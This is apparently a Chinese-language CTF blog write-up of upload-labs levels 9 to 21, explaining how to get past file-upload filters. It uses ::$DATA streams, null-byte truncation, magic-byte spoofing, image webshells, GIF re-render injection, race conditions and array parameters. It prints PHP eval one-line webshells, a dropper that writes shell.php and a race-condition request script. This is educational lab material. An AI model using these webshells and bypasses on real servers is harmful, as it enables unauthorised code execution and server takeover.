<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ada">在文件命令行里输入<br><br>echo 内容 &gt;&gt;文件名:额外数据流（可随便命名）<br><br><span class="hljs-keyword">type</span> <span class="hljs-type">文件名1&gt;&gt;文件名2:数据流名 </span>将文件名<span class="hljs-number">1</span>的内容写到文件名<span class="hljs-number">2</span>的额外数据流中<br><br>查看<br>notepad 文件名:额外数据流 用记事本来访问额外数据流<br></code></pre></td></tr></table></figure>

<p>例如：</p>
<p><img src="/../image/upload-pass09-2.png"></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">这里的	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好&quot;</span> &gt;&gt;<span class="hljs-number">1</span>.tx<span class="hljs-variable">t:nihao</span>	就是将<span class="hljs-string">&quot;你好&quot;</span>写入额外数据流nihao中<br>notepad <span class="hljs-number">1</span>.tx<span class="hljs-variable">t:nihao</span>	就是用记事本访问额外数据流<br>注意：直接打开<span class="hljs-number">1</span>.txt是看不到额外数据流的<br></code></pre></td></tr></table></figure>

<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">2.txt&gt;&gt;1.txt:study</span><br><span class="hljs-type"></span>将<span class="hljs-number">2</span>.txt的内容写到<span class="hljs-number">1</span>.txt的study额外数据流中<br></code></pre></td></tr></table></figure>

<p>原理：<strong>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名</strong> <strong>，且windows中的文件后缀不允许有::$DATA出现，所以自动解析后会去除，且这关代码确实少了去除字符串::$DATA</strong></p>
<p>抓包后修改后缀加上::$DATA</p>
<p><img src="/../image/upload-pass09-3.png"></p>
<p>注意：把后面添加的::$DATA删除才能连接成功</p>
<p><img src="/../image/upload-pass09-4.png"></p>
<h2 id="pass-10-点空格点绕过"><a href="#pass-10-点空格点绕过" class="headerlink" title="pass-10-点空格点绕过"></a>pass-10-点空格点绕过</h2><p>原理：查看源码发现源码会检验一遍文件名然后先去除末尾的.然后去除一个空格，之后就不会再进行检验了，.php. .去除一个.空格后就变成了.php. ，然后windows系统文件格式末尾的. 会在解析时自动去除，然后就能上传成功了。而后缀经过后端处理后变为了.不再黑名单中也能绕过</p>
<p>步骤：</p>
<p>就是先上传php文件，然后抓包修改php后缀，后面加上. .</p>
<h2 id="pass-11-双写后缀绕过"><a href="#pass-11-双写后缀绕过" class="headerlink" title="pass-11-双写后缀绕过"></a>pass-11-双写后缀绕过</h2><p>查看源码发现多了个函数<br><img src="/../image/upload-pass11-1.png"></p>
<p>原理：这个函数会从左到右检查$file_name如果其中存在$deny_ext数组中（黑名单）的后缀，会被替换为空值””，但是只替换一次，所以只要将后缀改为.pphphp即可</p>
<p>步骤：</p>
<ol>
<li><p>抓包修改后缀</p>
<p><img src="/../image/upload-pass11-2.png"></p>
</li>
<li><p>蚁剑连接</p>
</li>
</ol>
<h2 id="pass-12-00截断"><a href="#pass-12-00截断" class="headerlink" title="pass-12-%00截断"></a>pass-12-%00截断</h2><p><strong>前置知识：空字符</strong><br>0x00在编程语言中使用</p>
<p>%00在url编码中使用</p>
<p>url编码j就是先将ascii码值转为16进制，然后再加%。</p>
<p>相当于字符串结束标志，后面的内容不会被解析</p>
<p>原理：这关源码采用白名单，最终文件存放位置使用拼接形式，使用%00截断，<code>需要php版本&lt;5.3.4</code>，并且<code>magic_quotes_gpc</code>关闭。</p>
<p>存放位置拼接</p>
<p><img src="/../image/upload-pass12-1.png"></p>
<p>从源码看出只要修改save_path然后用%00截断后面的路径就能让文件以php格式保存到指定路径</p>
<p>提交一个mixbp.jpg文件然后抓包，并修改save_path为..&#x2F;upload&#x2F;mixbp.php%00</p>
<p><img src="/../image/upload-pass12-2.png"></p>
<p>打开图片链接后发现出现not found错误</p>
<p><img src="/../image/upload-pass12-3.png"></p>
<p>这是因为真实的保存路径是截断符号之前的内容所以无法打开，将截断符后面的内容删去即可</p>
<p><img src="/../image/upload-pass12-4.png"></p>
<p>连接成功</p>
<h2 id="psss-13-0x00截断"><a href="#psss-13-0x00截断" class="headerlink" title="psss-13-0x00截断"></a>psss-13-0x00截断</h2><p>这关源码和上关差不多，只是上关是在get传参里修改url编码，这关是改post请求（这关的save_path是通过post请求得到）<br>最终文件存放位置使用拼接形式，所以可以使用0x00截断</p>
<p>注意：POST不会对里面的数据自动解码，需要在Hex中修改。</p>
<p>上传mixbp.jpg文件然后抓包后修改</p>
<p>在..&#x2F;upload&#x2F;后添加mixbp.php空格，加空格是为了后续的hex修改，加其他字符也可以（就是一个占位符方便修改）</p>
<p><img src="/../image/upload-pass13-1.png"></p>
<p>添加完之后选中空格然后修改code Hex为00，就是将占位符改为十六进制的00（注意不能直接写0x00）</p>
<p><img src="/../image/upload-pass13-2.png"></p>
<p>然后放包上传成功就能复制图片链接用蚁剑连接了，后面的步骤和上关一样</p>
<h2 id="pass-14-字节标识绕过"><a href="#pass-14-字节标识绕过" class="headerlink" title="pass-14-字节标识绕过"></a>pass-14-字节标识绕过</h2><p>前置知识：图片字节标识<br><img src="/../image/upload-pass14-1.png"></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">字节是计算机中存储和传输数据的基本单位，通常表示为一个八位（<span class="hljs-number">8</span>-bit）的二进制数字序列。<span class="hljs-number">00000000</span><br><br>Utf<span class="hljs-number">-8</span>中，一个英文字符占一个字节，中文（含繁体字）占三个字节<br></code></pre></td></tr></table></figure>

<p>原理：查看源码发现这题会根据上传文件的前两个字节来判断文件格式，就是先将前两个字节从十六进制转换成十进制然后再白名单中比对。所以我们可以使用字节标识绕过</p>
<p>源码：</p>
<p><img src="/../image/upload-pass14-2.png"></p>
<p>例如：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">png</span>头两个字节为<span class="hljs-number">89</span> <span class="hljs-number">50</span>转换为十进制刚好是<span class="hljs-number">137</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>

<p>步骤：</p>
<p>这里我们如果直接将php改成png后缀，上传会不成功，因为源码会对文件的前两个字节验证，所以我们先在一句话木马前加上aa，然后前面就会多出两个61，我们将其改为89 50</p>
<p><img src="/../image/upload-pass14-3.png"></p>
<p>这里改完之后就能上传成功了，但是这里不会将我们上传的文件按php解析，用蚁剑会连接失败，所以我们要通过文件包含漏洞来运行，这会让我们上传的文件以php格式被解析</p>
<p><img src="/../image/upload-pass14-4.png"></p>
<p>点击文件包含按钮，出现代码，这里用GET传参来接收file文件</p>
<p><img src="/../image/upload-pass14-5.png"></p>
<p>在url中加入?file&#x3D;.&#x2F;upload&#x2F;3120250123211252.png，因为这个include.php在我们上传的文件的上级目录所以用.&#x2F;upload&#x2F;</p>
<p><img src="/../image/../image/upload-pass14-6.png"></p>
<p>然后就能用蚁剑连接了。</p>
<p>这关不改前两个字节也行，也能用图片马绕过</p>
<h2 id="pass-15-图片马绕过"><a href="#pass-15-图片马绕过" class="headerlink" title="pass-15-图片马绕过"></a>pass-15-图片马绕过</h2><p>前置知识：</p>
<p><img src="/../image/upload-pass15-1.png"></p>
<p><img src="/../image/upload-pass15-2.png"></p>
<p>原理：查看源码发现使用了getimagesize()函数和image_type_to_mime_type()函数，先将图像信息取出，然后将取出的图像类型常量值转换为MIME类型，从而验证文件类型。所以这里我们不能用字节标识绕过，但是可以用图片马绕过</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy  <span class="hljs-number">111</span>.png/b+<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.png</span> 将<span class="hljs-number">1</span>.php中的内容拷进<span class="hljs-number">11</span>.png中并重新生成png文件<span class="hljs-selector-tag">a</span><br>注意：这里注意把图片写在前面，将一句话木马写在后面才能解析成功<br></code></pre></td></tr></table></figure>

<p>在这个命令中，<code>/b</code> 是一个参数，用于指示复制操作的模式。在 Windows 系统中，<code>/b</code> 参数用于指示 <code>copy</code> 命令执行二进制拷贝，即按字节进行拷贝，而不进行任何转换。</p>
<p>步骤：</p>
<p>将我们的php一句话木马拷进nailong.jpg中，最后生成出来一个hack.jpg图片里面就含有我们的一句话木马</p>
<p><img src="/../image/upload-pass15-3.png"></p>
<p>然后上传hack.jpg之后使用文件包含漏洞即可，步骤和前一关相同</p>
<h2 id="pass-16-图片马绕过"><a href="#pass-16-图片马绕过" class="headerlink" title="pass-16-图片马绕过"></a>pass-16-图片马绕过</h2><p>和上一关一样，只是源码稍微不一样</p>
<h2 id="pass-17-二次渲染绕过"><a href="#pass-17-二次渲染绕过" class="headerlink" title="pass-17-二次渲染绕过"></a>pass-17-二次渲染绕过</h2><p>查看源码发现这关检查了content-type和后缀，并且用imagecreatefromjpeg,imagecreatefrompng,imagecreatefromgif函数判断上传的是否为这三种类型的文件，并且使用了二次渲染，导致我们普通的图片马会被渲染，导致失效。</p>
<p>步骤：</p>
<p>这关好像只能用gif，因为gif渲染前后文件相同的部分较多，而另外两种类型比gif更脆弱且渲染前后相同区域少，这里上传我们正常的gif图片，上传成功后在浏览器中下载被渲染后的图片，然后使用010editor工具中的tools内的compare file功能比较我们上传之前的图片与渲染后的图片，这里我们就能找到蓝色区域（就是两张图片Hex没有变化的部分），插入我们的一句话木马，<code>&lt;?php @eval($_POST[&#39;mixbp&#39;]);?&gt;</code></p>
<p><strong>注意：这里插入一句话木马要用粘贴不能自己输入，否则会出问题，并且尽量在匹配区域靠后的位置插入</strong></p>
<p><img src="/../image/upload-pass17-1.png"></p>
<p>上传之后使用文件包含漏洞打开</p>
<p><img src="/../image/upload-pass17-2.png"></p>
<p>然后就是蚁剑连接，与前面几关一样</p>
<p>第二种方法：这关也可以先将图片上传然后下载渲染后的文件，然后直接在渲染后的文件内插入一句话木马，因为这里的源码不会对渲染之后的文件再渲染了</p>
<h2 id="pass-18-条件竞争原理与绕过"><a href="#pass-18-条件竞争原理与绕过" class="headerlink" title="pass-18-条件竞争原理与绕过"></a>pass-18-条件竞争原理与绕过</h2><p>前置知识：条件竞争</p>
<p>文件上传条件竞争前提：</p>
<p>服务器会先将任意类型文件放在服务器上，然后再判断合法性，非法则删除</p>
<p>文件上传条件竞争本质：</p>
<p>抢夺线程的资源，使得我们上传的生成木马的文件可以被快速访问运行一次，达到非法目的</p>
<p><img src="/../image/upload-pass18-1.png"></p>
<p>源码分析：服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。</p>
<p>原理：如果这里有文件包含漏洞的话我们就能用前几关的图片马来绕过，但是这关没有，所以我们只能上传一个能够生成一句话木马的语句然后在这个语句被删除之前访问他（不能直接上传一句话木马访问，会被删除），利用burp多线程发包，然后不断在浏览器访问我们的shell，如果访问成功就会生成一句话木马</p>
<p><img src="/../image/upload-pass18-2.png"></p>
<p><img src="/../image/upload-pass18-3.png"></p>
<p>步骤：</p>
<p>上传11.php文件，内含<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#39;);?&gt;</code>，然后抓包</p>
<p><img src="/../image/upload-pass18-4.png"></p>
<p>把抓到的包放在intruder中设置攻击，清除payload$，这里选择null payloads然后选择无限重复，并在资源池内，将线程调到30，线程越高越容易访问到</p>
<p><img src="/../image/upload-pass18-5.png"></p>
<p>使用requests库构造一个python访问脚本，用来不断访问我们的11.php文件</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>url = <span class="hljs-string">&quot;http://192.168.32.1/upload/upload/11.php&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    html = requests.<span class="hljs-built_in">get</span>(url)<br>    <span class="hljs-keyword">if</span> html.status_code == 200:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)<br>        break<br></code></pre></td></tr></table></figure>

<p>开始攻击并且运行python脚本，看到脚本输出ok，代表访问成功</p>
<p><img src="/../image/upload-pass18-7.png"></p>
<p>然后就能用蚁剑去连接我们的shell.php了，连接成功</p>
<p><img src="/../image/upload-pass18-8.png"></p>
<p>这里不使用python脚本也行，我们访问<a target="_blank" rel="noopener" href="http://192.168.32.1/upload/upload/11.php%E8%B7%AF%E5%BE%84%E7%84%B6%E5%90%8E%E6%8A%93%E5%8F%96%E8%AE%BF%E9%97%AE%E5%8C%85%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E8%AE%BF%E9%97%AE%E5%8C%85%E8%AE%BE%E7%BD%AE%E6%94%BB%E5%87%BB%EF%BC%8C%E4%B9%9F%E6%98%AF%E9%80%89%E6%8B%A9null">http://192.168.32.1/upload/upload/11.php路径然后抓取访问包，然后将访问包设置攻击，也是选择null</a> payloads然后选择无限重复，调高线程成功访问概率会更大。然后就是先开启上传攻击，然后再访问攻击即可</p>
<h2 id="pass-19-apache解析漏洞-条件竞争"><a href="#pass-19-apache解析漏洞-条件竞争" class="headerlink" title="pass-19-apache解析漏洞+条件竞争"></a>pass-19-apache解析漏洞+条件竞争</h2><p>我们上传php文件，然后抓包改格式，源码会将我们的文件重命名为我们改的那个格式，又因为没有文件包含漏洞，不能将其以php格式解析，并且这里会先检查后缀，所以php文件还没有到服务器就被删掉了，所以这里不能用普通的条件竞争，要使用apache解析漏洞+条件竞争。</p>
<p>原理：apache不能解析.7z后缀名的文件，所以我们将11.php改为11.php.7z，这时apache会将其解析为11.php，从而实现绕过，然后这里我们的文件被转移到服务器后会被重命名，所以我们不断上传一个能生成一句话木马文件的小马，在被删除之前不断访问，即可得到shell</p>
<p>步骤：</p>
<p>将11.php文件上传然后抓包（内含<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["mixbp"])?>‘);?&gt;），然后修改后缀为11.php.7z</p>
<p><img src="/../image/upload-pass19-1.png"></p>
<p>然后就是不断的上传和访问（<a href="http://xxx.xxx.xxx.xx.1/upload/upload/11.php.7z）攻击，和上一关一样，后续步骤也一样。">http://xxx.xxx.xxx.xx.1/upload/upload/11.php.7z）攻击，和上一关一样，后续步骤也一样。</a></p>
<p><strong>注意：这关中，要实现多后缀解析漏洞需要在配置文件中修改配置 AddHandler application&#x2F;x-httpd-php .php</strong><br><strong>还有就是我这关不知道为什么重命名前我的文件变成了upload11.php.7z</strong></p>
<h2 id="pass-20-后缀绕过总结"><a href="#pass-20-后缀绕过总结" class="headerlink" title="pass-20-后缀绕过总结"></a>pass-20-后缀绕过总结</h2><p>源码分析：这关会将保存名称最后一个点之后的内容当做后缀名并验证，所以前面的所有后缀绕过都行，相当于前面后缀绕过的总结</p>
<p><img src="/../image/upload-pass20-1.png"></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">这里各种后缀绕过都行<br>比如：<br>点绕过	upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>.<br>点空格绕过	upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>.空格	<br>点空格点绕过	upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>. .<br>反斜杠	upload-<span class="hljs-number">19</span>.php\.		因为move_uploaded_file函数在move的时候会把\忽略掉<br>抓包后<span class="hljs-number">0</span>x00截断绕过	upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php0x00</span><span class="hljs-selector-class">.jpg</span>		因为windows读到<span class="hljs-number">0</span>x00就会被截断<br>抓包后<span class="hljs-variable">$DATA</span>绕过	upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span><br></code></pre></td></tr></table></figure>

<h2 id="pass-21-审计-数组后缀绕过"><a href="#pass-21-审计-数组后缀绕过" class="headerlink" title="pass-21-审计+数组后缀绕过"></a>pass-21-审计+数组后缀绕过</h2><p>代码审计</p>
<p><img src="/../image/upload-pass21-1.png"></p>
<p>验证步骤</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">1.</span>验证content-type是否为image/jpeg||image/png||image/gif<br><span class="hljs-number">2.</span>判断用POST发送的保存名称是否为空，如果为空<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>就用文件原名称，不为空就<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>就用保存名称<br><span class="hljs-number">3.</span>判断<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>是否为数组，如果不为数组就用explode()函数对<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>以<span class="hljs-string">&#x27;.&#x27;</span>来进行分割，使其变成数组<br><span class="hljs-number">4.</span>用end()函数取出<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>数组的最后一个元素，然后判断该后缀是否合法<br><span class="hljs-number">5.</span>用reset()函数取出数组第一位，然后与<span class="hljs-string">&#x27;.&#x27;</span>和<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>[count(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) - <span class="hljs-number">1</span>]进行拼接来生成保存文件名<span class="hljs-symbol">$</span>flie_name<br><span class="hljs-number">6.</span>使用move_uploaded_file()函数来将文件从临时目录转移到目标路径<br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">explode</span><span class="hljs-params">(separator,string[,limit])</span></span> 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">(array)</span></span>函数，输出数组中的当前元素和最后一个元素的值。<br><span class="hljs-function"><span class="hljs-title">reset</span><span class="hljs-params">(array)</span></span>函数，把数组的内部指针指向第一个元素，并返回这个元素的值<br><span class="hljs-function"><span class="hljs-title">count</span><span class="hljs-params">(array)</span></span>函数，计算数组中的单元数目，或对象中的属性个数<br></code></pre></td></tr></table></figure>

<p>原理：由于这里会将我们上传的保存名称分割为数组，但是我们直接发送数组，就可以绕过explode()，然后最后会将数组的第一位和第count($file)-1位进行拼接，所以我们只要保证数组第一位是1.php，然后第count($file-1)位为null即可拼接为1.php.在windows系统里会被自动删去后面的. 最后变为1.php，完成绕过</p>
<p>步骤：</p>
<p>上传我们的11.php（内含一句话木马）然后抓包，修改content-type为image&#x2F;jpeg||image&#x2F;png||image&#x2F;gif</p>
<p><img src="/../image/upload-pass21-2.png"></p>
<p>然后修改我们的POST的参数为save_name[0]，然后将save_name[0]的值改为1.php，然后复制POST请求，粘贴到下面改为save_name[2]，值改为jpg||png||gif，这样就会使$file[count($file)-1]&#x3D;$file[2-1]&#x3D;$file[1]&#x3D;null</p>
<p><img src="/../image/upload-pass21-3.png"></p>
<p>上传成功</p>
<p><img src="/../image/upload-pass21-4.png"></p>
<p>然后用蚁剑连接我们的一句话木马即可</p>
<h2 id="文件幻术头"><a href="#文件幻术头" class="headerlink" title="文件幻术头"></a>文件幻术头</h2><p>什么是文件幻术头<br>文件幻术头（也称为文件头、文件标识或魔术头）是文件的二进制数据中的一段特定字节序列，用于标识文件的类型或格式。它在文件的开头位置，并且通常是固定长度的。</p>
<h3 id="文件幻术头的主要作用"><a href="#文件幻术头的主要作用" class="headerlink" title="文件幻术头的主要作用"></a><strong>文件幻术头的主要作用</strong></h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">1.文件类型识别：文件幻术头可以帮助程序或操作系统识别文件的类型。通过读取文件幻术头的特定字节序列，可以确定文件的实际类型，例如图片文件、音频文件、视频文件等。这对于文件处理软件和操作系统来说非常重要，因为它们需要根据文件的类型采取不同的处理方式。<br>2.文件完整性验证：文件幻术头还可以用于验证文件的完整性。某些文件格式的幻术头包含了文件的校验和或哈希值，可以用于检测文件是否被篡改或损坏。例如，压缩文件格式如ZIP和GZIP在文件头中包含了校验和，可以用于验证文件的完整性。<br>3.文件类型扩展名关联：文件幻术头通常与文件的扩展名（例如<span class="hljs-string">.jpg</span>、<span class="hljs-string">.png</span>、<span class="hljs-string">.bmp</span>等）关联。文件的扩展名通常用于表示文件类型，但它们可以被篡改或者不准确，而文件幻术头提供了一种更可靠的方式来确定文件的实际类型。这对于操作系统和文件管理工具来说非常重要，可以确保文件被正确地关联到相应的应用程序进行打开或处理。<br>4.绕过文件类型检查：某些服务器端对文件类型的检查可能仅仅是检查文件的扩展名而不是文件的内容。你可以尝试修改木马文件的内容，使其符合服务器端允许的文件类型的文件格式。例如，你可以通过在文件开头添加合法的文件头（如GIF的文件头）来绕过文件类型检查。<br></code></pre></td></tr></table></figure>

<h3 id="常见的图片文件格式文件幻术头"><a href="#常见的图片文件格式文件幻术头" class="headerlink" title="常见的图片文件格式文件幻术头"></a><strong>常见的图片文件格式文件幻术头</strong></h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">JPEG</span>文件（.jpg或.jpeg）的幻术头：FF D8 FF<br><span class="hljs-attribute">PNG</span>文件（.png）的幻术头：<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span> <span class="hljs-number">0</span>D <span class="hljs-number">0</span>A <span class="hljs-number">1</span>A <span class="hljs-number">0</span>A<br><span class="hljs-attribute">GIF</span>文件（.gif）的幻术头：<span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">61</span> 或 <span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">37</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">BMP</span>文件（.bmp）的幻术头：<span class="hljs-number">42</span> <span class="hljs-number">4</span>D<br><span class="hljs-attribute">TIFF</span>文件（.tif或.tiff）的幻术头：<span class="hljs-number">4</span>D <span class="hljs-number">4</span>D <span class="hljs-number">00</span> <span class="hljs-number">2</span>A 或 <span class="hljs-number">49</span> <span class="hljs-number">49</span> <span class="hljs-number">2</span>A <span class="hljs-number">00</span><br><span class="hljs-attribute">ICO</span>文件（.ico）的幻术头：<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">WebP</span>文件（.webp）的幻术头：<span class="hljs-number">52</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">46</span> xx xx xx xx <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">42</span> <span class="hljs-number">50</span>，其中 xx 是文件大小的字节序列<br></code></pre></td></tr></table></figure>

<p>注意这里的16进制文件幻术头是字符经过前端编码后得到的，例如GIF的47 49 46 38 39  61经过16进制转换为字符后就是GIF89a,而这个GIF89a可以直接放到木马脚本的前面，因为上传的时候前端回将其编码为47 49 46 38 39  61（这里再burp抓到的包可以看到hex）。而其他几种文件的幻术头解码为字符串放到木马脚本前面再传的时候还是不行（因为解码出来有些不是机器码所以复制的时候回乱码）这里可以直接去burp里面改16进制包（在不破坏包的情况下改木马前面的十六进制）</p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
    </div>
</article>





    <div id="comments">
    <script>
        {
            const comments = document.getElementById("comments");
            const script = document.createElement("script");
            script.src = "https://giscus.app/client.js";
            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
            script.setAttribute('data-category', "Announcements");
            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
            script.setAttribute('data-mapping', "pathname");
            script.setAttribute('data-strict', "0");
            script.setAttribute('data-reactions-enabled', "1");
            script.setAttribute('data-emit-metadata', "0");
            script.setAttribute('data-input-position', "top");
            script.setAttribute('data-theme', "noborder_dark");
            script.setAttribute('data-lang', "zh-CN");
            script.setAttribute('data-loading', "lazy");
            script.setAttribute('crossorigin', "anonymous");
            script.setAttribute('async', "");
            comments.appendChild(script);
        }
    </script>
</div>



    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©MIXBP 2024
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    #post {
        background: url(/img/background.jpg);
    }
    
    
    #post .index {
        background: url(/img/background2.jpg);
    }
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        background: url("/img/bjtp.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>






<div class="mobile-menus-out" >

</div>
<div class="mobile-menus">
    
    
    
    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
    
    
    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
    
</div>


</html>
